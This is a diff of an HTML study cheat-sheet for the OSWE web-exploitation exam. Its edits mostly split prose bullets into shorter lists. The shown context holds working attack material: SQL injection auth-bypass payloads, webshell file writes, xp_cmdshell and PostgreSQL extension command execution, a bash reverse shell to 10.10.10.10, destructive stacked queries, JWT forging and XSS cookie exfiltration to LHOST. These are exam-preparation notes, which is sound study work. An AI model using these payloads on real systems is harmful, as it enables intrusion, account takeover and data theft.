@@ -127,16 +127,6 @@
             </ul>
           </li>
           <li class="dropdown">
-            <a href="./oscp_new.html" class="nav-link scrollto" onclick="toggleSubmenu(event)"><i
-                class="bi bi-journal-text navicon"></i>Notesv2 <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
-            <ul class="submenu">
-              <li><a href="./oscp_new.html" class="nav-link scrollto"><img src="./img/oscp_icon.png" alt="OSCP Icon" class="nav-icon-img">OSCP</a></li>
-              <li><a href="./osep_new.html" class="nav-link scrollto"><img src="./img/osep_icon.png" alt="OSEP Icon" class="nav-icon-img">OSEP</a></li>
-              <li><a href="./oswe_new.html" class="nav-link scrollto"><img src="./img/oswe_icon.svg" alt="OSWE Icon" class="nav-icon-img">OSWE</a></li>
-              <li><a href="./osed_new.html" class="nav-link scrollto"><img src="./img/osed_icon.svg" alt="OSED Icon" class="nav-icon-img">OSED</a></li>
-            </ul>
-          </li>
-          <li class="dropdown">
             <a href="./oscp_new.html" class="nav-link scrollto active" onclick="toggleSubmenu(event)"><i
                 class="bi bi-journal-text navicon"></i>Notesv2 <span class="arrow"><i class="bi bi-caret-right-fill"></i></span></a>
             <ul id="submenu2" class="submenu open">
@@ -184,9 +174,16 @@
           <div class="col-lg-12">
             <div class="cheatsheet-content">
 <h2 id="oswe-tools-setup">1. Tools &amp; Setup</h2>
-              <ul><li>This is a white-box exam: you receive the application source code and must produce a working, automated exploit for each target. The toolchain centers on Burp Suite Pro for traffic inspection, Python for scripted exploitation, a per-language IDE/debugger for stepping through source, and decompilers for closed binaries.</li></ul>
+              <ul>
+                <li>White-box exam &mdash; you receive the application source code and must produce a working automated exploit</li>
+                <li>Toolchain: Burp Suite Pro for traffic inspection, Python for scripted exploitation, per-language IDE/debugger, decompilers for closed binaries</li>
+              </ul>
               <h3 id="oswe-lab-setup">1.1 Lab Environment</h3>
-              <ul><li>Build one project folder per target with the source tree, your exploit script, captured Burp requests, and notes. Use a <code>requests.Session()</code> across the chain so cookies and tokens propagate automatically. Disable TLS verification (<code>s.verify = False</code>) since exam labs use self-signed certs.</li></ul>
+              <ul>
+                <li>One project folder per target with source tree, exploit script, captured Burp requests, and notes</li>
+                <li>Use <code>requests.Session()</code> so cookies and tokens propagate automatically</li>
+                <li>Disable TLS verification (<code>s.verify = False</code>) &mdash; exam labs use self-signed certs</li>
+              </ul>
               <table class="custom-table">
                 <thead><tr><th>Tool</th><th>Use Case</th></tr></thead>
                 <tbody>
@@ -205,7 +202,9 @@
                 </tbody>
               </table>
               <h3 id="oswe-script-skeleton">1.2 Exploit Script Skeleton</h3>
-              <ul><li>Every exam exploit follows the same shape: a <code>Session</code>, one function per stage of the chain (auth bypass &rarr; primitive &rarr; RCE trigger), arguments at the top for retargeting, and a <code>main</code> that runs them in order.</li></ul>
+              <ul>
+                <li>Every exploit follows the same shape: a <code>Session</code>, one function per stage (auth bypass &rarr; primitive &rarr; RCE trigger), arguments at the top, and a <code>main</code> that runs them in order</li>
+              </ul>
               <pre><code class="language-python">#!/usr/bin/env python3
 """Exploit - target: &lt;app&gt;  chain: SQLi auth bypass -&gt; RCE"""
 import requests, sys, re, argparse
@@ -241,7 +240,11 @@ if __name__ == "__main__":
     sqli_write_webshell()
     trigger_rce()</code></pre>
               <h3 id="oswe-source-recovery">1.3 Source Code Recovery (.NET &amp; Java)</h3>
-              <ul><li>White-box doesn&rsquo;t always mean human-readable. For .NET assemblies (DLL/EXE) use <strong>dnSpy</strong> or <strong>ILSpy</strong> to recover near-source-fidelity C#; both can also patch and re-save assemblies. For Java JAR/WAR/class files, use <strong>jd-gui</strong> for browsing or <strong>CFR</strong>/<strong>Procyon</strong> for batch decompilation to disk.</li></ul>
+              <ul>
+                <li>White-box doesn&rsquo;t always mean human-readable</li>
+                <li>.NET assemblies (DLL/EXE): use <strong>dnSpy</strong> or <strong>ILSpy</strong> for near-source-fidelity C#; both can patch and re-save</li>
+                <li>Java JAR/WAR/class files: <strong>jd-gui</strong> for browsing, <strong>CFR</strong>/<strong>Procyon</strong> for batch decompilation</li>
+              </ul>
               <pre><code class="language-bash"># .NET: decompile a DLL with ILSpy CLI
 ilspycmd Application.dll -o ./src/
 # Or use dnSpy GUI for interactive analysis + debugging
@@ -253,11 +256,23 @@ unzip app.jar -d app/
 find app -name "*.class" -exec procyon-decompiler -o src {} \;</code></pre>
 
               <h2 id="oswe-source-review">2. Source Code Review Methodology</h2>
-              <ul><li>White-box review starts at the <em>entry points</em> (routes/controllers that accept input) and follows tainted data downstream. Any user input that reaches a dangerous sink without sanitization is a vulnerability.</li></ul>
+              <ul>
+                <li>Start at entry points (routes/controllers that accept input) and follow tainted data downstream</li>
+                <li>Any user input reaching a dangerous sink without sanitization is a vulnerability</li>
+              </ul>
               <h3 id="oswe-review-approach">2.1 Review Approach</h3>
-              <ul><li>Map the attack surface first: enumerate every route, controller, and API endpoint (grep for <code>@app.route</code>, <code>app.get|post</code>, XML servlet mappings, controller annotations). Note which require auth and which don&rsquo;t. Then concentrate on pre-auth entry points &mdash; login, password reset, registration, public APIs, static handlers, anything that runs <em>before</em> the auth middleware &mdash; and trace tainted parameters from each into queries, deserializers, <code>eval</code>, file ops, and template engines. The exam-winning chain is usually pre-auth SQLi that writes a file, pre-auth SSRF that fetches a URL, or stored XSS that steals an admin token to reach an authenticated RCE endpoint.</li></ul>
+              <ul>
+                <li>Map the attack surface first: enumerate every route, controller, and API endpoint</li>
+                <li>Note which require auth and which don&rsquo;t</li>
+                <li>Focus on pre-auth entry points &mdash; login, password reset, registration, public APIs, static handlers</li>
+                <li>Trace tainted parameters into queries, deserializers, <code>eval</code>, file ops, and template engines</li>
+                <li>Typical exam-winning chain: pre-auth SQLi &rarr; file write, pre-auth SSRF &rarr; URL fetch, or stored XSS &rarr; admin token steal &rarr; authenticated RCE</li>
+              </ul>
               <h3 id="oswe-http-routing">2.2 HTTP Routing Patterns</h3>
-              <ul><li>Find every endpoint before you read any sinks. Each framework expresses routes differently, so know the patterns and grep accordingly.</li></ul>
+              <ul>
+                <li>Find every endpoint before reading any sinks</li>
+                <li>Each framework expresses routes differently &mdash; know the patterns and grep accordingly</li>
+              </ul>
               <table class="custom-table">
                 <thead><tr><th>Framework / Language</th><th>Route Pattern</th></tr></thead>
                 <tbody>
@@ -273,7 +288,10 @@ find app -name "*.class" -exec procyon-decompiler -o src {} \;</code></pre>
                 </tbody>
               </table>
               <h3 id="oswe-grep-sinks">2.3 Grep Patterns by Language</h3>
-              <ul><li>Every language has a small set of dangerous sinks. Grep for the sinks, then back-trace which user-controlled inputs reach them.</li></ul>
+              <ul>
+                <li>Every language has a small set of dangerous sinks</li>
+                <li>Grep for the sinks, then back-trace which user-controlled inputs reach them</li>
+              </ul>
               <pre><code class="language-bash"># PHP - dangerous sinks
 grep -rn "eval\|system\|exec\|passthru\|shell_exec\|popen\|proc_open" src/
 grep -rn "unserialize\|include\|require\|file_get_contents\|file_put_contents" src/
@@ -301,7 +319,10 @@ grep -rn "BinaryFormatter\|NetDataContract\|SoapFormatter\|LosFormatter\|XmlSeri
 grep -rn "Process\.Start\|cmd\.exe\|Powershell" src/
 grep -rn "ExecuteReader\|ExecuteNonQuery\|SqlCommand" src/</code></pre>
               <h3 id="oswe-taint-track">2.4 Manual Taint Tracking</h3>
-              <ul><li>For each sink, work backward: which function calls reach it, which parameter carries attacker data, and which sanitization (if any) runs along the way? Semgrep automates the source-to-sink trace for common languages.</li></ul>
+              <ul>
+                <li>For each sink, work backward: which function calls reach it, which parameter carries attacker data, what sanitization runs along the way</li>
+                <li>Semgrep automates the source-to-sink trace for common languages</li>
+              </ul>
               <pre><code class="language-bash"># Find parameters flowing into queries (quick scan for format-string SQL)
 grep -rn "query\s*=\s*.*\$_\(GET\|POST\|REQUEST\)" src/
 # Find places where user-controlled data is echoed without escaping (XSS)
@@ -311,7 +332,10 @@ semgrep --config p/php-security src/
 semgrep --config p/java-security src/
 semgrep --config p/nodejs-security .</code></pre>
               <h3 id="oswe-debugger-setup">2.5 Remote Debugger Setup</h3>
-              <ul><li>Stepping through the live app at the sink confirms exactly what value reaches it and what filtering happens along the way. Each language has its remote-debug protocol; attach with VS Code, IntelliJ, or PyCharm.</li></ul>
+              <ul>
+                <li>Step through the live app at the sink to confirm exactly what value reaches it and what filtering happens</li>
+                <li>Each language has its remote-debug protocol; attach with VS Code, IntelliJ, or PyCharm</li>
+              </ul>
               <pre><code class="language-bash"># PHP + Xdebug -&gt; VS Code
 # In php.ini:
 #   zend_extension=xdebug
@@ -332,9 +356,15 @@ JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005"
 python3 -m debugpy --listen 0.0.0.0:5678 --wait-for-client app.py</code></pre>
 
               <h2 id="oswe-auth-bypass">3. Authentication Bypass</h2>
-              <ul><li>Auth bypass is the first move in almost every white-box chain. It comes from logic flaws, type confusion, JWT weaknesses, or injection in the login/reset path &mdash; rarely from guessing credentials.</li></ul>
+              <ul>
+                <li>First move in almost every white-box chain</li>
+                <li>Comes from logic flaws, type confusion, JWT weaknesses, or injection in the login/reset path</li>
+              </ul>
               <h3 id="oswe-sqli-auth">3.1 SQL Injection Auth Bypass</h3>
-              <ul><li>When a login query is string-concatenated, inject a comment that makes the WHERE clause always true, or inject a valid second user. White-box is a gift: read the exact query and craft the precise payload that satisfies its column types and quoting.</li></ul>
+              <ul>
+                <li>When a login query is string-concatenated, inject a comment that makes the WHERE clause always true or inject a valid second user</li>
+                <li>White-box advantage: read the exact query and craft the precise payload</li>
+              </ul>
               <pre><code class="language-sql">-- Classic (MySQL, MSSQL, SQLite, PostgreSQL)
 username: admin'--
 username: admin'#           -- MySQL comment variant
@@ -349,7 +379,10 @@ password: */OR'1'='1
 -- Bypass hash comparison (SQLi in password field when hash is compared in PHP)
 password: ' OR password LIKE '%</code></pre>
               <h3 id="oswe-type-confusion">3.2 Type Confusion &amp; PHP Loose Comparisons</h3>
-              <ul><li>PHP&rsquo;s <code>==</code> compares <code>"0e12345&hellip;"</code> against <code>"0e99999&hellip;"</code> as floats and finds them equal &mdash; the &ldquo;magic hash&rdquo; trick. JSON deserialization can also slip an integer where a string is expected, which loose comparison treats as equal.</li></ul>
+              <ul>
+                <li>PHP <code>==</code> compares <code>"0e12345..."</code> against <code>"0e99999..."</code> as floats and finds them equal &mdash; the &ldquo;magic hash&rdquo; trick</li>
+                <li>JSON deserialization can slip an integer where a string is expected, which loose comparison treats as equal</li>
+              </ul>
               <pre><code class="language-php">// Vulnerable: if ($hash == $input_hash)
 // PHP ==  compares "0e12345..." == "0e99999..." as floats -&gt; TRUE
 // Submit any value whose MD5/SHA1 starts with "0e" followed only by digits.
@@ -359,7 +392,10 @@ password: ' OR password LIKE '%</code></pre>
 // POST body: {"user": 0, "pass": "anything"}  -&gt; PHP 0 == "admin" is TRUE (loose ==)
 // Fix uses === or password_verify(); white-box you see which.</code></pre>
               <h3 id="oswe-jwt-bypass">3.3 JWT Attacks</h3>
-              <ul><li>Decode every JWT first &mdash; the header reveals the algorithm. Try algorithm confusion (RS256&rarr;HS256 with the public key as the HMAC secret), the <code>alg: none</code> attack, and a brute-force of the HS256 secret against rockyou.</li></ul>
+              <ul>
+                <li>Decode every JWT first &mdash; the header reveals the algorithm</li>
+                <li>Try algorithm confusion (RS256&rarr;HS256 with the public key as HMAC secret), <code>alg: none</code> attack, brute-force HS256 secret</li>
+              </ul>
               <pre><code class="language-bash"># Decode a JWT (no verification)
 jwt_tool "eyJ..." -d
 
@@ -375,7 +411,10 @@ jwt_tool "eyJ..." -C -d /usr/share/wordlists/rockyou.txt
 # Forge a new payload once secret or key confusion is found
 jwt_tool "eyJ..." -T    # interactive tamper mode</code></pre>
               <h3 id="oswe-reset-bypass">3.4 Password Reset Logic Flaws</h3>
-              <ul><li>The reset flow is a common pre-auth path to admin. Look for predictable tokens (timestamp- or sequence-derived &mdash; the openCRX chapter shows this), missing invalidation after use, host-header injection that builds the reset URL from <code>Host</code>, HTTP parameter pollution that splits recipient and reset target, and timing differences that enable account enumeration.</li></ul>
+              <ul>
+                <li>Reset flow is a common pre-auth path to admin</li>
+                <li>Look for: predictable tokens (timestamp/sequence-derived), missing invalidation after use, host-header injection, HTTP parameter pollution, timing-based account enumeration</li>
+              </ul>
               <pre><code class="language-python"># openCRX-style: token derived from a seeded PRNG using the current timestamp.
 # Step 1: request a reset for a known account and capture the reset timestamp.
 # Step 2: predict the PRNG state for a window of seeds around that timestamp.
@@ -399,9 +438,15 @@ for seed in range(now - 5, now + 5):
 # Some frameworks pick the first for the mail recipient, the last for the reset DB write.</code></pre>
 
               <h2 id="oswe-sql-injection">4. SQL Injection &rarr; RCE</h2>
-              <ul><li>The course&rsquo;s ManageEngine and ERPNext chapters both go from SQLi to RCE. The dominant techniques are file writes (<code>INTO OUTFILE</code>, <code>COPY TO</code>, large objects), stored procedures (<code>xp_cmdshell</code>), and PostgreSQL extensions / UDFs.</li></ul>
+              <ul>
+                <li>ManageEngine and ERPNext chapters both go from SQLi to RCE</li>
+                <li>Dominant techniques: file writes (<code>INTO OUTFILE</code>, <code>COPY TO</code>, large objects), stored procedures (<code>xp_cmdshell</code>), PostgreSQL extensions / UDFs</li>
+              </ul>
               <h3 id="oswe-sqli-enum">4.1 Enumeration &amp; Fingerprinting</h3>
-              <ul><li>The first injection always identifies the DBMS &mdash; error messages, comment syntax, and version functions all give it away. White-box you already know from the source; confirm at runtime anyway, because exam targets sometimes proxy through ORMs that change escaping.</li></ul>
+              <ul>
+                <li>First injection always identifies the DBMS &mdash; error messages, comment syntax, and version functions</li>
+                <li>White-box: you know from the source; confirm at runtime anyway</li>
+              </ul>
               <pre><code class="language-sql">-- Database fingerprint via version
 SELECT @@version             -- MySQL / MSSQL
 SELECT version()             -- PostgreSQL
@@ -412,7 +457,11 @@ SELECT extractvalue(1,concat(0x7e,(SELECT version())))
 -- MSSQL: CONVERT error
 SELECT CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))</code></pre>
               <h3 id="oswe-sqli-read-write">4.2 File Read / Write via SQLi</h3>
-              <ul><li>Each DBMS exposes its own file-write primitive. MySQL has <code>INTO OUTFILE</code>; PostgreSQL has <code>COPY &hellip; TO</code> and large objects (<code>lo_export</code>); MSSQL has <code>xp_cmdshell</code>. Targets often disable the obvious path &mdash; have the fallback ready.</li></ul>
+              <ul>
+                <li>Each DBMS exposes its own file-write primitive</li>
+                <li>MySQL: <code>INTO OUTFILE</code>; PostgreSQL: <code>COPY ... TO</code> and large objects; MSSQL: <code>xp_cmdshell</code></li>
+                <li>Targets often disable the obvious path &mdash; have the fallback ready</li>
+              </ul>
               <pre><code class="language-sql">-- MySQL: read a file (FILE privilege required)
 SELECT LOAD_FILE('/etc/passwd')
 -- MySQL: write a webshell (secure_file_priv must be unset or point to web root)
@@ -430,7 +479,10 @@ EXEC master..xp_cmdshell 'powershell -enc ...'
 EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;</code></pre>
               <h3 id="oswe-pg-udf">4.3 PostgreSQL UDF / Extension RCE</h3>
-              <ul><li>When file write is blocked but you have superuser, build a malicious C extension with <code>system()</code> inside and load it via <code>CREATE EXTENSION</code>. The ManageEngine chapter walks this end-to-end &mdash; compile the extension to <code>.so</code>, host it on your server, load it remotely, and call the new function.</li></ul>
+              <ul>
+                <li>When file write is blocked but you have superuser, build a malicious C extension with <code>system()</code></li>
+                <li>ManageEngine chapter walks this end-to-end: compile to <code>.so</code>, host on your server, load remotely, call the function</li>
+              </ul>
               <pre><code class="language-c">// rce_ext.c - PostgreSQL extension that runs an OS command
 #include "postgres.h"
 #include "fmgr.h"
@@ -456,7 +508,10 @@ BEGIN EXECUTE 'COPY (SELECT '''') TO PROGRAM ' || quote_literal(cmd); END;
 $$ LANGUAGE plpgsql SECURITY DEFINER;
 SELECT exec('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1"');</code></pre>
               <h3 id="oswe-sqli-stacked">4.4 Stacked Queries &amp; Stored Procedures</h3>
-              <ul><li>When the driver allows stacked queries (<code>mysqli_multi_query</code>, PDO with PG/MSSQL), you can append a second statement that creates a function, enables a config, or directly executes a command via the database&rsquo;s built-ins.</li></ul>
+              <ul>
+                <li>When the driver allows stacked queries (<code>mysqli_multi_query</code>, PDO with PG/MSSQL), append a second statement</li>
+                <li>Can create a function, enable a config, or directly execute a command via database built-ins</li>
+              </ul>
               <pre><code class="language-sql">-- MySQL stacked queries (mysqli_multi_query or some PDO configs)
 '; DROP TABLE users;--
 '; INSERT INTO admins(user,pass) VALUES('hax','hax');--
@@ -466,7 +521,10 @@ SELECT exec('bash -c "bash -i &gt;&amp; /dev/tcp/10.10.10.10/443 0&gt;&amp;1"');
    EXEC sp_configure ''xp_cmdshell'',1;RECONFIGURE;
    EXEC xp_cmdshell ''whoami'';--</code></pre>
               <h3 id="oswe-sqli-blind">4.5 Blind / Time-Based SQLi</h3>
-              <ul><li>When the query is in code and you can&rsquo;t see results, automate a character-by-character extraction with a time-based oracle. Pick a sleep function per DBMS: MySQL <code>SLEEP</code>, PostgreSQL <code>pg_sleep</code>, MSSQL <code>WAITFOR DELAY</code>.</li></ul>
+              <ul>
+                <li>When you can&rsquo;t see query results, automate character-by-character extraction with a time-based oracle</li>
+                <li>Sleep functions: MySQL <code>SLEEP</code>, PostgreSQL <code>pg_sleep</code>, MSSQL <code>WAITFOR DELAY</code></li>
+              </ul>
               <pre><code class="language-python">import requests, string, time
 
 TARGET = "http://10.10.10.10/search"
@@ -487,9 +545,16 @@ print()
 # For PostgreSQL: pg_sleep(2); for MSSQL: WAITFOR DELAY '0:0:2'</code></pre>
 
               <h2 id="oswe-xss">5. Cross-Site Scripting &rarr; Account Takeover</h2>
-              <ul><li>The chains here rarely care about <code>alert(1)</code>. Stored or DOM-based XSS is used to fetch the admin&rsquo;s CSRF token and exfiltrate data, create a backdoor account, or trigger an authenticated RCE endpoint.</li></ul>
+              <ul>
+                <li>Stored or DOM-based XSS is used to fetch the admin&rsquo;s CSRF token, create a backdoor account, or trigger an authenticated RCE endpoint</li>
+                <li>The chains here rarely care about <code>alert(1)</code></li>
+              </ul>
               <h3 id="oswe-xss-recon">5.1 Finding &amp; Confirming XSS</h3>
-              <ul><li>Send a canary and grep the response for it unescaped. Different contexts demand different breakouts: closing a quoted attribute, escaping a <code>&lt;script&gt;</code> block, or hopping out of a JS string literal. A polyglot probes several at once.</li></ul>
+              <ul>
+                <li>Send a canary and grep the response for it unescaped</li>
+                <li>Different contexts demand different breakouts: closing a quoted attribute, escaping a <code>&lt;script&gt;</code> block, hopping out of a JS string literal</li>
+                <li>A polyglot probes several contexts at once</li>
+              </ul>
               <pre><code class="language-bash"># Basic reflection canary - look for it unescaped in the response
 curl -s "http://target/search?q=xsscanary123" | grep xsscanary123
 
@@ -500,7 +565,12 @@ curl -s "http://target/search?q=xsscanary123" | grep xsscanary123
 # Polyglot to probe multiple contexts at once
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//</code></pre>
               <h3 id="oswe-xss-dom">5.2 DOM-Based XSS</h3>
-              <ul><li>DOM XSS lives entirely in client-side JavaScript &mdash; the server never sees the payload. Sources include <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code>; sinks include <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, and <code>setTimeout(string)</code>. The openITCOCKPIT chapter chains a DOM XSS through a websocket client.</li></ul>
+              <ul>
+                <li>DOM XSS lives entirely in client-side JavaScript &mdash; server never sees the payload</li>
+                <li>Sources: <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code></li>
+                <li>Sinks: <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, <code>setTimeout(string)</code></li>
+                <li>openITCOCKPIT chapter chains a DOM XSS through a websocket client</li>
+              </ul>
               <pre><code class="language-javascript">// Vulnerable DOM pattern (sink: innerHTML; source: location.hash)
 document.getElementById("greeting").innerHTML = location.hash.slice(1);
 // Payload: http://target/page#&lt;img src=x onerror=alert(1)&gt;
@@ -510,7 +580,10 @@ innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln,
 eval, Function, setTimeout("...", N), setInterval("...", N),
 location, location.href, location.assign, location.replace</code></pre>
               <h3 id="oswe-xss-cookie-steal">5.3 Session Cookie / Token Exfiltration</h3>
-              <ul><li>If cookies lack <code>HttpOnly</code>, classic exfil works. Otherwise pivot &mdash; read the CSRF token from a page reachable with the victim&rsquo;s session, and chain into a state-changing request.</li></ul>
+              <ul>
+                <li>If cookies lack <code>HttpOnly</code>, classic exfil works</li>
+                <li>Otherwise pivot &mdash; read the CSRF token from a page reachable with the victim&rsquo;s session and chain into a state-changing request</li>
+              </ul>
               <pre><code class="language-javascript">// Classic cookie exfil (HttpOnly=false required)
 &lt;script&gt;fetch("http://LHOST/x?c="+document.cookie)&lt;/script&gt;
 &lt;img src=x onerror="this.src='http://LHOST/?c='+document.cookie"&gt;
@@ -518,7 +591,9 @@ location, location.href, location.assign, location.replace</code></pre>
 // Fetch API - works across modern browsers, handles redirects
 &lt;script&gt;fetch("http://LHOST/?c="+btoa(document.cookie))&lt;/script&gt;</code></pre>
               <h3 id="oswe-xss-csrf">5.4 XSS to CSRF Chain (Admin Action)</h3>
-              <ul><li>Read the admin&rsquo;s page (which carries their cookies via <code>credentials:"include"</code>), extract the CSRF token from it, then POST a privileged action with the matching token.</li></ul>
+              <ul>
+                <li>Read the admin&rsquo;s page (carries their cookies via <code>credentials:"include"</code>), extract CSRF token, POST a privileged action</li>
+              </ul>
               <pre><code class="language-javascript">// Steal CSRF token from admin's page, then POST a state-changing request
 fetch("/admin/settings", {credentials:"include"})
   .then(r =&gt; r.text())
@@ -1313,6 +1388,7 @@ request|attr('\x5f\x5fclass\x5f\x5f')</code></pre>
   <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-c.min.js"></script>
   <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-java.min.js"></script>
   <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-javascript.min.js"></script>
+  <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-json.min.js"></script>
   <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-markup-templating.min.js"></script>
   <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-php.min.js"></script>
   <script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/components/prism-python.min.js"></script>
